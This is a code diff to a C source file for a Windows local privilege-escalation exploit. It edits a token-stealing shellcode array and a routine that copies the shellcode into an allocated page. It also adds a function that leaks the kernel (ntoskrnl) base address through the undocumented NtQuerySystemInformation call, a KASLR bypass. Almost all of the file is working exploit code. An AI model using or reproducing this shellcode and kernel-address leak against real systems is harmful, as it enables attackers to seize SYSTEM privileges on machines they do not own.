@@ -10,12 +10,16 @@
 #include <stdint.h>
 #include <tlhelp32.h>
 #include <tchar.h>
+#include <malloc.h>
 
 #pragma comment(lib, "user32.lib")
 
 #define SYSTEM_PROCESS_NAME "lsass.exe"
 
-BOOL DebugMode = FALSE;
+#define KERNEL_PROCESS_PATH "\\SystemRoot\\system32\\"KERNEL_PROCESS_NAME
+#define KERNEL_PROCESS_NAME "ntoskrnl.exe"
+
+#define DEBUG FALSE
 
 
 DWORD GetPageSize();
@@ -28,7 +32,7 @@ DWORD GetPageSize();
 void static __xlog(const char* prio, const char* format, va_list args)
 {
         size_t fmt_len = strlen(format)+strlen(prio)+2;
-        uint8_t *fmt = alloca(fmt_len);
+        PCHAR fmt = alloca(fmt_len);
         RtlFillMemory(fmt, fmt_len, '\x00');
         sprintf(fmt, "%s %s", prio, format);
         vfprintf(stderr, fmt, args);
@@ -97,8 +101,7 @@ VOID hexdump(PVOID data, SIZE_T size)
         SIZE_T i, j;
 
         for (i = 0; i < size; ++i) {
-                PVOID ptr = data+i;
-                BYTE c = *((PCHAR)ptr);
+                BYTE c = *((PCHAR)data+i);
 
                 printf("%02X ", c);
                 if (c >= 0x20 && c <= 0x7e) {
@@ -298,7 +301,9 @@ const char StealTokenShellcode[] = ""
         "\x59"                                                      // pop rcx
         "\x5b"                                                      // pop rbx
         "\x58"                                                      // pop rax
-        "\x48\x83\xc4\x28"                                          // add rsp, 40
+#ifdef __ALIGN_STACK__
+        "\x48\x83\xc4\x28"                                          // add rsp, 0x28
+#endif
         "\x48\x31\xc0"                                              // xor rax, rax
         "\xc3"                                                      // ret
 #else
@@ -338,7 +343,7 @@ PVOID AllocatePageWithShellcode()
 
         ZeroMemory(lpBuf, dwSize);
         CopyMemory(lpBuf, (PVOID)StealTokenShellcode, StealTokenShellcodeLength);
-        RtlFillMemory(lpBuf+StealTokenShellcodeLength, dwSize-StealTokenShellcodeLength, '\xcc');
+        RtlFillMemory((PCHAR)lpBuf+StealTokenShellcodeLength, dwSize-StealTokenShellcodeLength, '\xcc');
 
         return lpBuf;
 }
@@ -403,4 +408,70 @@ DWORD GetPageSize()
         SYSTEM_INFO siSysInfo;
         GetSystemInfo(&siSysInfo);
         return siSysInfo.dwPageSize;
+}
+
+
+/**
+ * Retrieve ntoskrnl image base from the undocumented syscall NtQuerySystemInformation(SystemModuleInformation)
+ *
+ * See :
+ * - https://recon.cx/2013/slides/Recon2013-Alex%20Ionescu-I%20got%2099%20problems%20but%20a%20kernel%20pointer%20ain%27t%20one.pdf
+ * - https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/class.htm
+ */
+#define SystemModuleInformation  (SYSTEM_INFORMATION_CLASS)0xb
+ULONG_PTR GetKernelImageBase()
+{
+        struct _RTL_PROCESS_MODULE_INFORMATION
+        {
+                        /**
+                         * Structures from Process Hacker source code
+                         * http://processhacker.sourceforge.net/doc/ntldr_8h_source.html#l00511
+                         */
+                        HANDLE Section;
+                        PVOID MappedBase;
+                        PVOID ImageBase;
+                        ULONG ImageSize;
+                        ULONG Flags;
+                        USHORT LoadOrderIndex;
+                        USHORT InitOrderIndex;
+                        USHORT LoadCount;
+                        USHORT OffsetToFileName;
+                        UCHAR FullPathName[256];
+        };
+
+        struct _RTL_PROCESS_MODULES
+        {
+                        ULONG NumberOfModules;
+                        struct _RTL_PROCESS_MODULE_INFORMATION Modules[1];
+        };
+
+        ULONG_PTR res = 0;
+        NTSTATUS status;
+        struct _RTL_PROCESS_MODULES *Modules;
+
+        Modules = (struct _RTL_PROCESS_MODULES *)HeapAlloc(GetProcessHeap(), 0, 0x100000);
+
+        status = NtQuerySystemInformation(SystemModuleInformation,
+                                          Modules,
+                                          0x100000,
+                                          NULL);
+        if(!NT_SUCCESS(status)){
+                perr("NtQuerySystemInformation() failed");
+        } else {
+                ok("Found %ld modules, searching for kernel...\n", Modules->NumberOfModules);
+
+                for (int i=0; i<Modules->NumberOfModules; i++){
+                        struct _RTL_PROCESS_MODULE_INFORMATION m = Modules->Modules[i];
+                        PCHAR name = m.FullPathName;
+
+                        if (strcmp(name, KERNEL_PROCESS_PATH)==0){
+                                info ("Found Module[%d] -> %s (%p)\n", i, name, m.ImageBase);
+                                res = (ULONG_PTR)m.ImageBase;
+                                break;
+                        }
+                }
+        }
+
+        HeapFree(GetProcessHeap(), 0, Modules);
+        return res;
 }
